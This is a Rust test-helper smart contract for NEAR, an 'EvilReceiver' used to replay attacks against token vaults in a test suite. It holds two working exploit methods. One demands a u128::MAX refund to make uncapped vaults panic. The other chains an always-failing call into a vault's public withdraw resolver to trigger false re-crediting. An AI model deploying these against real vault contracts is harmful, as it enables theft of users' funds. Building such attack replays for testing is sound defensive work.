//! TEST HELPER. The attacker's contract in the backed-chaos replays.
//!
//! - `on_deposit_notify` asks for an absurd refund (u128::MAX). A vault that
//!   subtracts it without a cap panics in its resolve (NEAR Intents, Oct 2026).
//! - `chain_resolve` chains a call that always fails into a vault's
//!   withdraw resolver, so a public resolver sees "transfer failed" and
//!   re-credits (SWEAT/HOT pattern).

use near_sdk::json_types::U128;
use near_sdk::{env, near, AccountId, Gas, NearToken, Promise};

#[near(contract_state)]
#[derive(Default)]
pub struct EvilReceiver {}

#[near]
impl EvilReceiver {
    /// F4: request a refund far larger than anything deposited.
    pub fn on_deposit_notify(&mut self, sender_id: AccountId, amount: U128) -> U128 {
        let _ = (sender_id, amount);
        U128(u128::MAX)
    }

    /// F5: `fail()` then `vault.<method>(args)`. The vault's callback runs with
    /// a failed promise result, as if its own transfer had failed.
    pub fn chain_resolve(&mut self, vault: AccountId, method: String, args: String) -> Promise {
        Promise::new(env::current_account_id())
            .function_call("fail".to_string(), b"{}".to_vec(), NearToken::from_yoctonear(0), Gas::from_tgas(5))
            .then(Promise::new(vault).function_call(method, args.into_bytes(), NearToken::from_yoctonear(0), Gas::from_tgas(30)))
    }

    pub fn fail(&self) {
        env::panic_str("evil-receiver: this call always fails");
    }
}
